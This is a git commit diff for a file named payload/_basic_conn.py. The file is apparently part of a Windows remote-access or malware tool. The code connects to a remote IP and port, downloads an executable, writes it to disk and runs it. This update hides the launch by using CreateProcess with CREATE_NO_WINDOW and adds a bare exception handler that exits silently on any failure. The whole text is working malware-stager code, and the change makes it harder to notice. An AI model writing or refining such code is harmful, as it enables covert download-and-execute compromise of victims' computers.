607059e2504bc61d4cc6b86b7366ee7f45dcc2c9
D0WE1L1N <1372449351@qq.com>
2022-12-26 11:54:53 +0800

    v0.2.2 update

--- payload/_basic_conn.py
+++ payload/_basic_conn.py
@@ -5,21 +5,25 @@
 import socket
 from os import rename, remove, system
 from sys import exit
+from win32process import CreateProcess, CREATE_NO_WINDOW, STARTUPINFO
 def _connect(ip, port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((ip, port))
-    s.recv(1024)
-    s.send(bytes(str(len(_id)), 'utf8'))
-    s.recv(1024)
-    s.send(bytes(_id, 'utf8'))
-    s.recv(1024)
-    len_data = s.recv(1024).decode('utf8')
-    s.send(bytes("OK", "UTF8"))
-    upload_data = s.recv(int(len_data))
-    f = open(f"{_id}.exe", "wb+")
-    f.write(upload_data)
-    f.close()
-    s.close()
-    system(f"start {_id}.exe")
-    exit(0)
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip, port))
+        s.recv(1024)
+        s.send(bytes(str(len(_id)), 'utf8'))
+        s.recv(1024)
+        s.send(bytes(_id, 'utf8'))
+        s.recv(1024)
+        len_data = s.recv(1024).decode('utf8')
+        s.send(bytes("OK", "UTF8"))
+        upload_data = s.recv(int(len_data))
+        f = open(f"{_id}.exe", "wb+")
+        f.write(upload_data)
+        f.close()
+        s.close()
+        CreateProcess(f"{_id}.exe", '', None, None, 0, CREATE_NO_WINDOW, None, None, STARTUPINFO())
+        exit(0)
+    except:
+        exit(0)
 
